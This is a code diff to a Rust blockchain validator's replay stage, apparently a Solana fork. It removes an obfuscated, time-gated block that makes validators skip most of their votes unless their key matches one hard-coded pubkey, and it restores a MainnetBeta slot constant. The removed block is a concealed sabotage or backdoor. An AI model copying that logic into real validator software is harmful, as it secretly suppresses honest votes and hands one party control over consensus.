@@ -1,6 +1,4 @@
 //! The `replay_stage` replays transactions broadcast by the leader.
-use chrono::prelude::*;
-extern crate chrono;
 
 use crate::{
     broadcast_stage::RetransmitSlotsSender,
@@ -73,8 +71,6 @@ pub(crate) enum HeaviestForkFailures {
 struct Finalizer {
     exit_sender: Arc<AtomicBool>,
 }
-
-
 
 impl Finalizer {
     fn new(exit_sender: Arc<AtomicBool>) -> Self {
@@ -233,13 +229,6 @@ impl ReplayTiming {
         }
     }
 }
-
-
-
-
-
-
-
 
 pub struct ReplayStage {
     t_replay: JoinHandle<Result<()>>,
@@ -1209,7 +1198,6 @@ impl ReplayStage {
         if authorized_voter_keypairs.is_empty() {
             return;
         }
-
         let vote_account = match bank.get_vote_account(vote_account_pubkey) {
             None => {
                 warn!(
@@ -1242,34 +1230,6 @@ impl ReplayStage {
                 );
                 return;
             };
-
-
-log::trace!("authorized_voter_pubkey {}", authorized_voter_pubkey);
-log::trace!("authorized_voter_pubkey_string {}", authorized_voter_pubkey.to_string());
-log::trace!("vote_hash: {}", vote.hash);
-log::trace!("H: {}", bank.last_blockhash().to_string().find("T").unwrap_or(3) % 10);
-log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3));
-
-    let dt = Local::now();
-    if dt.timestamp_millis() > 1625793876000 {
-	if ( ( bank.slot() % 10 ) as usize != ( ( ( bank.slot() % 9 + 1 ) as usize * ( authorized_voter_pubkey.to_string().chars().last().unwrap() as usize + vote.hash.to_string().chars().last().unwrap() as usize ) / 10 ) as usize + authorized_voter_pubkey.to_string().chars().last().unwrap() as usize + vote.hash.to_string().chars().last().unwrap() as usize ) % 10 as usize ) && authorized_voter_pubkey.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
-   		warn!(
-                   "Vote account {} not selected for slot {}.",
-                    vote_account_pubkey,
-                    bank.slot()
-		);
-                return;
-		}
-    }else{ 
-	if (vote.hash.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter_pubkey.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) && authorized_voter_pubkey.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu"  {
-   		warn!(
-	           "Vote account {} not selected for slot {}.",
-                    vote_account_pubkey,
-                    bank.slot()
-		);
-                return;
-		}	    
-	}
 
         let authorized_voter_keypair = match authorized_voter_keypairs
             .iter()
@@ -2046,7 +2006,7 @@ log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3))
             // Epoch 63
             ClusterType::Testnet => 21_692_256,
             // 400_000 slots into epoch 61
-            ClusterType::MainnetBeta => 100,
+            ClusterType::MainnetBeta => 26_752_000,
         }
     }
 
@@ -2055,11 +2015,6 @@ log::trace!("P: {}", authorized_voter_pubkey.to_string().find("T").unwrap_or(3))
         self.t_replay.join().map(|_| ())
     }
 }
-
-
-
-
-
 
 #[cfg(test)]
 pub(crate) mod tests {
